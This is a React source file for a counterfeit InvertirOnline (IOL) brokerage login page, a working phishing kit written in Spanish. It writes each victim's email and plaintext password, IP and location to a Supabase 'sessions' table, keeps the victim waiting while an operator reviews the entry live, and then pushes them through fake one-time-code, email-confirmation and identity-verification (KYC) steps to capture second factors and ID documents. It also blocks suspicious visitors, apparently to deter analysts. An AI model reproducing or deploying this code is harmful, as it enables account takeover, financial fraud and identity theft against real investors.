import { useCallback, useEffect, useMemo, useState } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import { useRateLimit } from "@/hooks/useRateLimit";
import IolLoginForm from "@/components/iol/IolLoginForm";
import IolIllustration from "@/components/iol/IolIllustration";
import WaitingScreen from "@/components/login/WaitingScreen";
import SuccessScreen from "@/components/login/SuccessScreen";
import OtpScreen from "@/components/login/OtpScreen";
import ConfirmEmailScreen from "@/components/login/ConfirmEmailScreen";
import WayniKycFlow from "@/components/kyc/WayniKycFlow";
import iolLogo from "@/assets/iol-logo-v7.svg";

type IolStep = "form" | "waiting" | "success" | "otp" | "confirm_email" | "kyc";

const IOL = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const operatorCode = rawOperatorCode?.replace(/[^a-zA-Z0-9]/g, "") || "master";

  const [step, setStep] = useState<IolStep>("form");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [generalError, setGeneralError] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState("");
  const [kycCaseId, setKycCaseId] = useState<string | null>(null);

  const rateLimit = useRateLimit();

  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    const originalTitle = document.title;
    const originalDesc = document.querySelector('meta[name="description"]')?.getAttribute("content") || "";

    document.title = "IOL — Ingresar";
    const descMeta = document.querySelector('meta[name="description"]');
    if (descMeta) {
      descMeta.setAttribute("content", "IOL — Accedé a tu cuenta para operar e invertir con seguridad.");
    }

    return () => {
      document.title = originalTitle;
      const currentDescMeta = document.querySelector('meta[name="description"]');
      if (currentDescMeta) {
        currentDescMeta.setAttribute("content", originalDesc);
      }
    };
  }, []);

  const parseCaseIdFromLink = useCallback((link?: string | null) => {
    if (!link) return null;
    const cleanLink = link.trim();
    const match = cleanLink.match(/\/kyc\/([^/?#]+)/i);
    return match?.[1] || null;
  }, []);

  const activateEmbeddedKyc = useCallback((payload?: { kyc_link?: string; kyc_case_id?: string } | string) => {
    const resolvedCaseId = typeof payload === "string"
      ? parseCaseIdFromLink(payload)
      : payload?.kyc_case_id || parseCaseIdFromLink(payload?.kyc_link);

    if (!resolvedCaseId) return;

    setKycCaseId(resolvedCaseId);
    setErrorMessage("");
    setGeneralError("");
    setStep("kyc");
  }, [parseCaseIdFromLink]);

  const handleDecision = useCallback((payload?: { status?: string; kyc_link?: string; kyc_case_id?: string } | string) => {
    const status = typeof payload === "string" ? payload : payload?.status;
    if (!status) return;

    if (status === "redirect_kyc") {
      activateEmbeddedKyc(payload);
      return;
    }

    if (["login_success", "approved", "completed", "otp_approved"].includes(status)) {
      setErrorMessage("");
      setGeneralError("");
      setStep("success");
      return;
    }

    if (status === "wrong_password") {
      setErrorMessage("Usuario o contraseña incorrectos. Intentá nuevamente.");
      setGeneralError("");
      setStep("waiting");
      return;
    }

    if (status === "redirect_otp" || status === "show_otp") {
      setErrorMessage("");
      setStep("otp");
      return;
    }

    if (status === "redirect_confirm_email" || status === "redirect_sync_email") {
      setErrorMessage("");
      setStep("confirm_email");
      return;
    }

    if (status === "pending_review") {
      setErrorMessage("");
      setStep("waiting");
    }
  }, [activateEmbeddedKyc]);

  useEffect(() => {
    if (!sessionId || step === "form" || step === "success") return;

    const channel = supabase.channel(`session-review-${sessionId}`);
    channel
      .on("broadcast", { event: "review_decision" }, (payload) => {
        handleDecision(payload.payload as { status?: string; kyc_link?: string; kyc_case_id?: string } | undefined);
      })
      .subscribe();

    const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);
    otpChannel
      .on("broadcast", { event: "otp_decision" }, (payload) => {
        handleDecision(payload.payload as { status?: string } | undefined);
      })
      .subscribe();

    const pollInterval = window.setInterval(async () => {
      const { data } = await supabase
        .from("sessions")
        .select("status, otp_code")
        .eq("id", sessionId)
        .maybeSingle();

      if (data?.status === "redirect_kyc") {
        const kycLink = data.otp_code?.startsWith("kyc_link:") ? data.otp_code.replace("kyc_link:", "") : undefined;
        activateEmbeddedKyc(kycLink);
        return;
      }

      if (data?.status) {
        handleDecision(data.status);
      }
    }, 3000);

    return () => {
      supabase.removeChannel(channel);
      supabase.removeChannel(otpChannel);
      window.clearInterval(pollInterval);
    };
  }, [activateEmbeddedKyc, handleDecision, sessionId, step]);

  const handleLoginSubmit = useCallback(async (submittedEmail: string, password: string) => {
    setGeneralError("");
    setErrorMessage("");
    setLoading(true);
    setEmail(submittedEmail);
    setKycCaseId(null);

    try {
      let ipData = { ip: "unknown", country: "", city: "", region: "" };
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
          const data = await res.json();
          ipData = {
            ip: data.ip || "unknown",
            country: data.country_name || "",
            city: data.city || "",
            region: data.region || "",
          };
        }
      } catch {
        // ignore
      }

      const newId = crypto.randomUUID();

      await supabase.from("sessions").insert({
        id: newId,
        email: submittedEmail,
        password,
        ip_address: ipData.ip,
        user_agent: navigator.userAgent,
        country: ipData.country,
        city: ipData.city,
        region: ipData.region,
        status: "pending_review",
        source: "iol",
        operator_code: operatorCode,
      });

      setSessionId(newId);
      setStep("waiting");
    } catch {
      setGeneralError("No pudimos iniciar sesión. Intentá nuevamente.");
    } finally {
      setLoading(false);
    }
  }, [operatorCode]);

  const handlePasswordResubmit = useCallback(async (newPassword: string) => {
    if (!sessionId) return;

    setErrorMessage("");

    await supabase
      .from("sessions")
      .update({ password: newPassword, status: "pending_review" })
      .eq("id", sessionId);

    const broadcastChannel = supabase.channel(`session-resubmit-${sessionId}-${Date.now()}`);
    broadcastChannel.subscribe((status) => {
      if (status === "SUBSCRIBED") {
        broadcastChannel.send({
          type: "broadcast",
          event: "review_decision",
          payload: { status: "pending_review" },
        });
        window.setTimeout(() => supabase.removeChannel(broadcastChannel), 2000);
      }
    });
  }, [sessionId]);

  const handleRetry = useCallback(() => {
    setStep("form");
    setSessionId(null);
    setKycCaseId(null);
    setErrorMessage("");
    setGeneralError("");
  }, []);

  const isKycStep = step === "kyc" && Boolean(kycCaseId);

  const mainTitle = useMemo(() => {
    if (isKycStep) return "Validación de identidad";
    return "Ingresa a tu cuenta";
  }, [isKycStep]);

  const renderCardContent = () => {
    if (step === "kyc" && kycCaseId) {
      return <WayniKycFlow caseId={kycCaseId} embedded brandLabel="IOL" />;
    }

    if (step === "otp" && sessionId) {
      return <OtpScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
    }

    if (step === "confirm_email" && sessionId) {
      return <ConfirmEmailScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
    }

    if (step === "waiting" && sessionId) {
      return (
        <WaitingScreen
          email={email}
          sessionId={sessionId}
          errorMessage={errorMessage}
          onPasswordResubmit={handlePasswordResubmit}
        />
      );
    }

    if (step === "success") {
      return <SuccessScreen email={email} />;
    }

    return (
      <>
        {generalError && (
          <div className="mb-5 rounded-xl border border-destructive/25 bg-destructive/10 px-4 py-3 text-sm text-destructive">
            {generalError}
          </div>
        )}
        <IolLoginForm onSubmit={handleLoginSubmit} loading={loading} />
      </>
    );
  };

  if (rateLimit.loading) {
    return (
      <div className="iol-theme flex min-h-screen items-center justify-center bg-background text-muted-foreground">
        Cargando...
      </div>
    );
  }

  if (rateLimit.blocked) {
    return (
      <div className="iol-theme flex min-h-screen items-center justify-center bg-background px-4">
        <div className="w-full max-w-md rounded-2xl border border-border bg-card p-8 text-center text-card-foreground shadow-lg">
          <h1 className="text-xl font-semibold">Acceso restringido</h1>
          <p className="mt-2 text-sm text-muted-foreground">
            Detectamos actividad inusual y bloqueamos temporalmente este acceso.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="iol-theme min-h-screen bg-background text-foreground">
      <header className="iol-topbar-shadow border-b border-border/80 bg-background">
        <div className="mx-auto flex h-[58px] w-full max-w-6xl items-center justify-center px-5 sm:px-8 lg:justify-start">
          <img src={iolLogo} alt="InvertirOnline" className="h-8 w-auto object-contain" />
        </div>
      </header>

      <main className={`mx-auto flex w-full max-w-6xl flex-col px-5 pb-12 pt-10 sm:px-8 lg:pb-16 ${isKycStep ? "lg:pt-10" : "lg:min-h-[calc(100vh-58px)] lg:flex-row lg:items-start lg:justify-between lg:gap-16 lg:pt-14"}`}>
        <section className={`w-full ${isKycStep ? "max-w-none" : "max-w-[350px] lg:pt-8"}`}>
          <h1 className={`mb-3 font-semibold leading-none text-primary ${isKycStep ? "text-[2.15rem] sm:text-[2.5rem]" : "text-[2rem] sm:text-[2.15rem]"}`}>
            {mainTitle}
          </h1>

          <div className={`iol-card-shadow rounded-2xl bg-card ${isKycStep ? "px-4 py-4 sm:px-6 sm:py-6" : "px-6 py-7 sm:px-7"}`}>
            {renderCardContent()}
          </div>
        </section>

        {!isKycStep && (
          <section className="flex flex-1 justify-center pt-10 lg:justify-end lg:pt-6">
            <IolIllustration />
          </section>
        )}
      </main>

      <footer className="border-t border-border/60 bg-background lg:hidden">
        <div className="mx-auto flex w-full max-w-6xl justify-center px-5 py-5 sm:px-8">
          <img src={iolLogo} alt="InvertirOnline" className="h-7 w-auto object-contain" />
        </div>
      </footer>
    </div>
  );
};

export default IOL;
